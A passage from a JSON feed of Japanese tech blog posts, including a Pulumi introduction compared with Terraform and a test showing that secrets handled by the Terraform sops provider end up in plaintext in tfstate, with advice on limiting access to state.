2023の12/17の記事です。mattnさんによる「Vim で SQL を素で編集してるの？」Vimのレジスタ、使いこなしてますか？とっても沢山種類があります。","isoDate":"2023-12-17T00:00:00.000Z","dateMiliSeconds":1702771200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"terraform test: 基本機能","link":"https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97","contentSnippet":"この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...","isoDate":"2023-12-16T14:58:00.000Z","dateMiliSeconds":1702738680000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"Terraform使いがPulumiに入門しました","link":"https://blog.masasuzu.net/entry/2023/12/16/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from \\"@pulumi/pulumi\\";import * as aws from \\"@pulumi/aws\\";import * as awsx from \\"@pulumi/awsx\\";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket(\\"my-bucket\\");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from \\"@pulumi/aws\\";import * as terraform from \\"@pulumi/terraform\\";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference(\\"network\\", {    backendType: \\"local\\",    path: \\"/path/to/terraform.tfstate\\",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput(\\"vpc_id\\");const publicSubnetIds = networkState.getOutput(\\"public_subnet_ids\\");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: \\"ami-7172b611\\",        instanceType: \\"t2.medium\\",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。","isoDate":"2023-12-15T15:00:00.000Z","dateMiliSeconds":1702652400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"sbt-github-acitons を使った CI の構築とプロジェクトの publish について","link":"https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4","contentSnippet":"この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...","isoDate":"2023-12-15T03:00:00.000Z","dateMiliSeconds":1702609200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴","link":"https://zenn.dev/toshikish/articles/e846fa0c3de10f","contentSnippet":"状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    \\"Version\\": \\"2012-10-17\\",    \\"Statement\\": [        {            \\"Effect\\": \\"Allow\\",            \\"Principal\\": \\"*\\",            \\"Action\\": \\"s3:*\\",            \\"Resource...","isoDate":"2023-12-14T22:00:00.000Z","dateMiliSeconds":1702591200000,"authorName":"toshikish","authorId":"toshikish"},{"title":"拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ","link":"https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f","contentSnippet":"※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...","isoDate":"2023-12-14T15:31:58.000Z","dateMiliSeconds":1702567918000,"authorName":"seno","authorId":"seno"},{"title":"AWS Fault Injection Service で EKS の障害テストを行う","link":"https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e","contentSnippet":"この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...","isoDate":"2023-12-13T22:22:00.000Z","dateMiliSeconds":1702506120000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更","link":"https://zenn.dev/toversus/articles/88ce2ea66b532d","contentSnippet":"Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...","isoDate":"2023-12-13T00:43:43.000Z","dateMiliSeconds":1702428223000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Unlocking Cloud Native Security","link":"https://speakerdeck.com/kyohmizu/unlocking-cloud-native-security","contentSnippet":"CloudNative Days Tokyo 2023 の登壇資料です。2023/12/12\\rhttps://event.cloudnativedays.jp/cndt2023","isoDate":"2023-12-12T05:00:00.000Z","dateMiliSeconds":1702357200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"telescope.nvimによるjumplistをちょっと便利にするテク","link":"https://blog.atusy.net/2023/12/12/telescope-jump-list/","contentSnippet":"Vimアドベントカレンダー12/10の記事です。Omochiceさんによる「使っているvimプラグインの棚卸し(2023冬)」KaitoMuraokaさんによる「初心者向けに何か」（2023/12/23 9:54時点で未投稿）TelescopeはNeovimにおけるFuzzy Finderのデファクトの座を勝ち取っていると思います。便利な一方、痒いところに手を出すと途端に難解でundocumentedなAPIに手を出す羽目になります……。","isoDate":"2023-12-12T00:00:00.000Z","dateMiliSeconds":1702339200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Helmfile でちょっとしたリソースを追加したい","link":"https://zenn.dev/toshikish/articles/5ead548816e618","contentSnippet":"動機Helmfile で公式のチャートをインストールしていて，追加で関連リソースを追加したいことがあります。関連リソースの数が多い，内容が環境によって変わるなどの場合は，カスタムチャートを追加することになるでしょう。ただ，そこまで複雑ではない，関連リソースが数個レベルの場合，カスタムチャートだと大げさに感じることがあります。そこでどうすべきか迷っていたところ，同僚の toVersus さんに別の方法を教えていただきました。 extraTemplates 系の変数を使うHelm チャートによっては extraTemplates や extraObjects といった変数が...","isoDate":"2023-12-11T10:57:21.000Z","dateMiliSeconds":1702292241000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Amazon S3 バケットの terraform destroy に注意","link":"https://zenn.dev/toshikish/articles/190fe076cc63f4","contentSnippet":"TL;DRAmazon S3 バケットを削除する前には，必ずすべてのオブジェクトを削除しよう。aws_s3_bucket リソースの force_destroy 引数 を true にしてもよい。terraform destroy で削除すると，パブリックアクセスできる旨のアラートが出る場合があるので注意しよう。aws_s3_bucket_public_access_block リソースを terraform state rm するとアラートが出ない。マネジメントコンソールから削除してもアラートは出ない。 S3 バケットの terraform dest...","isoDate":"2023-12-11T09:03:06.000Z","dateMiliSeconds":1702285386000,"authorName":"toshikish","authorId":"toshikish"},{"title":"sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメント","link":"https://zenn.dev/nnaka2992/articles/blue_grean_on_postgres_with_sqldeff_and_pgroll","contentSnippet":"この記事はこのエントリー以下のアドベントカレンダーの11日目の記事です。3-shake Advent Calendar 2023昨日はtoyb0xによるTODOコメントをチケット管理するためのESLint Custom Ruleでした。PostgreSQL Advent Calendar 2023昨日は@ozozatyによるPostgreSQLのjsonb型でJSONパス式(JSONPath)を使うでした。 はじめにPostgreSQLではDDLはその性質からテーブルレベルでロックを取得してしまいます。SREやPlatform EngineeringなどDev...","isoDate":"2023-12-10T23:30:00.000Z","dateMiliSeconds":1702251000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitLab CIでKICSを実行する","link":"https://zenn.dev/tayusa/articles/d28865c5ce49c6","contentSnippet":"やることTerraformの静的解析を行うKICSの結果をgitlab-commentでMRに出力するhttps://github.com/yuyaban/gitlab-commentKICSの結果を基にMRにReviewdogで指摘するhttps://github.com/reviewdog/reviewdog KICSの実行$ kics scan --config kics.yamlkics.yamlpath: \\".\\" # 解析するTerraformの場所output-path: \\".\\" # 結果の出力先report-formats:...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Golangでk8s Deploymentを再起動させる","link":"https://zenn.dev/tayusa/articles/a7df40b7d6fd5b","contentSnippet":"やることclient-goを使って複数のDeploymentを同時に再起動させる Golang Deploymentの取得Pod内であればrest.InClusterConfig()でPodのServiceAccountを使用するconfigを取得できるclientset.AppsV1().Deployments(namespace).Get(ctx, deploymentName, metav1.GetOptions{}) でDeploymentを取得NamespaceとDeploymentの名前が必要k8s.gopackage maini...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"denops製VimプラグインでDenoのバージョンとキャッシュ位置を固定する","link":"https://blog.atusy.net/2023/12/10/denops-cache/","contentSnippet":"Vimアドベントカレンダー12/10の記事です。nil2さんによる「Vimのデフォルトキーマップをどのように上書きするか(ノーマルモード)」atusyによる「VimでgfしたらURLをブラウザで開く」さて本題。denops.vimというプラグイン開発エコシステムがあります。denops.vim は JavaScript/TypeScript のランタイムである Deno を利用して Vim/Neovim 双方で動作するプラグインを作るためのエコシステムです。https://zenn.dev/lambdalisue/articles/b4a31fba0b1ce95104c9","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"TypeScript で LangChain の最初の一歩","link":"https://zenn.dev/satohjohn/articles/9415f85be332e6","contentSnippet":"このエントリーは 3-shake Advent Calendar 2023 の10日目の記事です。今年は Python をガッツリ触ったり、 LLM などの方面に手を出してきており、新しいことにまみれております。その中で LLM のシステム作るんだったら Python だろ？っていう中で TypeScript でもちゃんとできるよーっていうことで紹介していきたいと思います。 私が、あんまり Python でアプリ作っていくのが好きじゃないのもありますもちろん、 Python よりも TypeScript のほうが機能が少なめではありますので、そのあたりは、目をつぶっております。今...","isoDate":"2023-12-09T15:00:00.000Z","dateMiliSeconds":1702134000000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Mastering Bitcoin Third Editionの紹介","link":"https://speakerdeck.com/shukob/mastering-bitcoin-third-editionnoshao-jie","contentSnippet":"https://cryptocurrency.connpass.com/event/303416/\\r2023年12月9日(土)ビットコインとか忘年会のLTで、同年11月に出版されたMastering Bitcoin Third Editionの紹介をしました。","isoDate":"2023-12-09T05:00:00.000Z","dateMiliSeconds":1702098000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"VimでgfしたらURLをブラウザで開く","link":"https://blog.atusy.net/2023/12/09/gf-open-url/","contentSnippet":"Vimアドベントカレンダー12/9の記事です。NI57721さんによる「長文丸暗記用のVimプラグインを作った話」yasunori0418さんによる「ヘルプから始めるddu」gfはいいぞgfコマンド、便利ですよね。gfと入力すると、そのファイルをバッファに開いてくれます。","isoDate":"2023-12-09T00:00:00.000Z","dateMiliSeconds":1702080000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"今よりちょっとだけ上手く文章を書くコツ","link":"https://qiita.com/kojake_300/items/c5def031a252323fae1c","contentSnippet":"この記事は、3-shake Advent Calendar 2023 9日目のエントリ記事です。技術的な話ではありませんはじめに国語がとても苦手だった私は、社会人になったときに日本語力の無さに…","isoDate":"2023-12-08T22:01:43.000Z","dateMiliSeconds":1702072903000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか","link":"https://blog.masasuzu.net/entry/2023/12/09/014230","contentSnippet":"qiita.comこの記事は、3-shake Advent Calendar 2023の9日目の記事となります。sops プロバイダーとは本当に安心?ドキュメントを調べる挙動を実験する結論ワークアラウンドsops プロバイダーとはcarlpett/terraform-provider-sops: A Terraform provider for reading Mozilla sops filesDocs overview | carlpett/sops | Terraform | Terraform RegistrysopsプロバイダーはMozilla sopsを使用して暗号化されたファイルから機密情報を取り出して、terraform上で使用できるようにしたものです。暗号化の鍵をAWS KMS等を使うことにより、KMSキーを使う権限を持つ人だけ機密情報にアクセスできるようにするものです。sopsで機密情報を暗号化することにより、平文で機密情報をgitレポジトリに保存することがなくなり安全ということになります。機密情報を管理したい。でも平文では保存したくない。そういう用途にこちらは使用されます。本当に安心?SOPSを使って機密情報を暗号化することによりgitレポジトリには機密情報が平文で残らない。これで安心と言われていますが、よく考えると機密情報をterraform実行時にはリソースに対して平文で与えているはずです。つまり、tfstate上は機密情報が平文で保存されています。例えば、tfstateがS3に保存されているとして、KMSキーへの権限がない人でもS3バケットにアクセスする権限があれば、平文の機密情報が見れてしまいます。あまりないと思いますが、tfstateをlocalに保存するようにしていてそれをgit管理していてらなんのために暗号化しているのか。。。。ということになります。こう考えると組織のポリシーによるが、sopsプロバイダーによる暗号化では不十分ではないかという疑問が生まれます。ドキュメントを調べるまずプロバイダードキュメントを当たってみます。Docs overview | carlpett/sops | Terraform | Terraform RegistryTo prevent plaintext secrets from being written to disk, you\xa0must\xa0use a secure remote state backend. See the\xa0official docs\xa0on\xa0Sensitive Data in State\xa0for more information.これが意味してるのはバックエンドをlocalにした場合平文で機密情報が書かれるので、安全なリモートバックエンドを利用すべきということだと思います。State: Sensitive Data | Terraform | HashiCorp Developer参照しろと言われたドキュメントの該当部分を読んでみましょう。ローカルディスクにtfstateを保存した場合は、機密情報が平文で保存されます。リモートにtfstateを保存する場合、保存時に暗号化されるかはバックエンドに依存します。基本的にリモートステートを使うことを推奨しています。例えば、Terraform Cloudを使う場合、tfstateは暗号化され、転送時もTLSで暗号化されます。S3を使う場合もSSE-S3やSSE-KMS等でサーバサイド暗号化を有効にしておくことで、保管時の暗号化がされます。バケットポリシーでHTTPSを強制することで通信時の暗号化も保証することができます。参考: 暗号化によるデータの保護 - Amazon Simple Storage Service参考: Amazon S3 のセキュリティのベストプラクティス - Amazon Simple Storage Serviceところがですね。保存時、通信時の暗号化をしても、terraform state pullすると平文でtfstateが手に入ってしまうんですよ。。。後述します。挙動を実験する以下のような設定ファイルを作ります。sopsで暗号化したdb_userとdb_passwordをパラメータストアに設定するものになります。tools-versionsterraform 1.5.5sops 3.7.3main.tfterraform {  required_version = \\"~> 1.5.5\\"  required_providers {    aws = {      source  = \\"hashicorp/aws\\"      version = \\"~> 5.15\\"    }    sops = {      source  = \\"carlpett/sops\\"      version = \\"~> 0.7.2\\"    }  }  backend \\"s3\\" {    region  = \\"ap-northeast-1\\"    bucket  = \\"xxxxxxxxxx\\"    key     = \\"test.tfstate\\"  }}provider \\"sops\\" {}provider \\"aws\\" {  region = \\"ap-northeast-1\\"}data \\"sops_file\\" \\"secrets\\" {  source_file = \\"secrets.yaml\\"}resource \\"aws_ssm_parameter\\" \\"db_user\\" {  type     = \\"String\\"  name     = \\"/test/db_user\\"  value    = data.sops_file.secrets.data.db_user}resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    = data.sops_file.secrets.data.db_password}暗号化前の secrets.yamldb_user: userdb_password: passwordapply結果がこちらとなります。terraform apply% export SOPS_KMS_ARN=arn:aws:kms:ap-northeast-1:xxxxxxxxx:key/yyyyyyyyyyyyyyyyyy% terraform applydata.sops_file.secrets: Reading...data.sops_file.secrets: Read complete after 1s [id=-]Terraform used the selected providers to generate the following execution plan. Resource actions areindicated with the following symbols:  + createTerraform will perform the following actions:  # aws_ssm_parameter.db_password will be created  + resource \\"aws_ssm_parameter\\" \\"db_password\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_password\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"SecureString\\"      + value          = (sensitive value)      + version        = (known after apply)    }  # aws_ssm_parameter.db_user will be created  + resource \\"aws_ssm_parameter\\" \\"db_user\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_user\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"String\\"      + value          = (sensitive value)      + version        = (known after apply)    }Plan: 2 to add, 0 to change, 0 to destroy.Do you want to perform these actions?  Terraform will perform the actions described above.  Only \'yes\' will be accepted to approve.  Enter a value: yesaws_ssm_parameter.db_password: Creating...aws_ssm_parameter.db_user: Creating...aws_ssm_parameter.db_user: Creation complete after 0s [id=/test/db_user]aws_ssm_parameter.db_password: Creation complete after 0s [id=/test/db_password]Apply complete! Resources: 2 added, 0 changed, 0 destroyed.terraform apply  8.91s user 0.78s system 124% cpu 7.811 totalstate showするとパラメータストアなのでsensitive扱いになっていて、見れません。これはいけるか?terraform state show% terraform state show aws_ssm_parameter.db_password# aws_ssm_parameter.db_password:resource \\"aws_ssm_parameter\\" \\"db_password\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\"    data_type = \\"text\\"    id        = \\"/test/db_password\\"    key_id    = \\"alias/aws/ssm\\"    name      = \\"/test/db_password\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"SecureString\\"    value     = (sensitive value)    version   = 1}% terraform state show aws_ssm_parameter.db_user    # aws_ssm_parameter.db_user:resource \\"aws_ssm_parameter\\" \\"db_user\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_user\\"    data_type = \\"text\\"    id        = \\"/test/db_user\\"    name      = \\"/test/db_user\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"String\\"    value     = (sensitive value)    version   = 1}ここで、terraform state pullをしてみて、tfstateファイルをローカルにダウンロードします。そのtfstateファイルの中の該当部分はこちらとなります。    {      \\"mode\\": \\"managed\\",      \\"type\\": \\"aws_ssm_parameter\\",      \\"name\\": \\"db_password\\",      \\"provider\\": \\"provider[\\\\\\"registry.terraform.io/hashicorp/aws\\\\\\"]\\",      \\"instances\\": [        {          \\"schema_version\\": 0,          \\"attributes\\": {            \\"allowed_pattern\\": \\"\\",            \\"arn\\": \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\",            \\"data_type\\": \\"text\\",            \\"description\\": \\"\\",            \\"id\\": \\"/test/db_password\\",            \\"insecure_value\\": null,            \\"key_id\\": \\"alias/aws/ssm\\",            \\"name\\": \\"/test/db_password\\",            \\"overwrite\\": null,            \\"tags\\": null,            \\"tags_all\\": {},            \\"tier\\": \\"Standard\\",            \\"type\\": \\"SecureString\\",            \\"value\\": \\"password\\",            \\"version\\": 1          },          \\"sensitive_attributes\\": [            [              {                \\"type\\": \\"get_attr\\",                \\"value\\": \\"value\\"              }            ]          ],          \\"private\\": \\"bnVsbA==\\",          \\"dependencies\\": [            \\"data.sops_file.secrets\\"          ]        }      ]    },tfstateファイルの中身をよく確認するとしっかり平文で見えています。残念。\\"value\\": \\"password\\",結論sopsプロバイダーを使用することによりgitレポジトリ上に機密情報を平文で保存することはなくなります。しかしながら、tfstateのデータ上では設定値が平文で保存されることを防ぐことはできません。terraform state pullする権限があれば、機密情報が見れてしまいます。運用組織のポリシーで、tfstateへのアクセス権限を適切に権限管理することができるのであれば、選択肢としては取りうります。暗号化のためのKMSキー、tfstateを保存するS3バケットを機密情報をアクセス可能な人のみ権限を与えることが徹底できればよいです。しかしながら、機密情報をいかなる場合でもローカルに平文で保存することが許容されない組織であれば、機密情報は手動で設定することを選択したほうが望ましいと思います。どうしても機密情報をterraformで管理したのであれば、クライアントサイドで暗号化した機密情報をterraformで管理し、アプリ等で使用時にクライアントサイドで復号を行う形も考えられます。安全かどうかは、tfstateの保存場所、tfstateへのアクセス権限、暗号化鍵のアクセス権限それぞれが適切に設定されているかどうかが鍵となります。他に何かうまい方法で機密情報を管理しているという方がいらっしゃれば、ご意見ください。ワークアラウンドこれは自分がよく使う手段となります。リソースの箱だけ作って、作成時にダミーの値を入れておき、実際の値は手動で設定するという手法です。ignore_changesを入れておくことで、手動で値を変更しても、terraform的には差分ができないようにしています。これにより、機密情報をterraformの外に追い出しつつも、機密情報を入れるリソース自体は監理するということが実現できます。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}","isoDate":"2023-12-08T16:42:30.000Z","dateMiliSeconds":1702053750000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AlloyDB omni on Kubernetesを眺める","link":"https://zenn.dev/nnaka2992/articles/viewing_alloydb_omni_operator","contentSnippet":"このエントリーは以下のアドベントカレンダーの6日目の記事です。3-shake Advent Calendar 2023 シリーズ1昨日は@bells17さんによるChainguard imagesについて調べてみたでした。PostgreSQL Advent Calendar 2023 シリーズ2Kubernetes Advent Calendar 2023昨日は@yassan168さんによるRKE2ノードのCiliumを使ったeBPFな帯域制限をする話でした。 背景を眺める2023年10月12日にAlloyDB OmniのGAに併せてAlloyDB Omni o...","isoDate":"2023-12-05T23:30:00.000Z","dateMiliSeconds":1701819000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Chainguard imagesについて調べてみた","link":"https://zenn.dev/bells17/articles/chainguard-images","contentSnippet":"※この記事は3-shake Advent Calendar 2023 シリーズ1の12月5日の記事です最近Chainguard imagesというdistrolessコンテナイメージについて知ったので、簡単に調べてみました。 Chainguard imagesとは？Chainguard imagesはChainguard社によって提供されているdistrolessを中心としたセキュアなコンテナイメージ群だ、という理解です。Wolfiという(おそらくこれもChainguard社が開発している)コンテナ・クラウドネイティブ用途向けのLinux undistroなOSを利用して各C...","isoDate":"2023-12-05T03:58:09.000Z","dateMiliSeconds":1701748689000,"authorName":"bells17","authorId":"bells17"},{"title":"Cloud Loggingについて","link":"https://zenn.dev/nedoko_dok0dko/articles/ef07acbb983d01","contentSnippet":"whatGoogle CloudのCloud Loggingについて基本概要など調べたことをまとめる適宜追記予定 Cloud Loggingとはhttps://cloud.google.com/logging/docs/overview?hl=jaGoogleCloud上のシステム等が生成したログを収集・保管・管理するための仕組み。基本的にGoogleCloud上のサービスが出力するログはCloud Loggingへと集められる。収集されたログはログバケットと呼ばれるストレージで保管され、期間が過ぎたら破棄するといった設定を行うことが可能。ログはコンソールのログ...","isoDate":"2023-12-04T11:05:41.000Z","dateMiliSeconds":1701687941000,"authorName":"seno","authorId":"seno"},{"title":"吉祥寺.pm35 でLTしてきました。 #kichijojipm","link":"https://blog.masasuzu.net/entry/2023/12/03/161754","contentSnippet":"吉祥寺.pm こと 句会吉祥寺.pm35 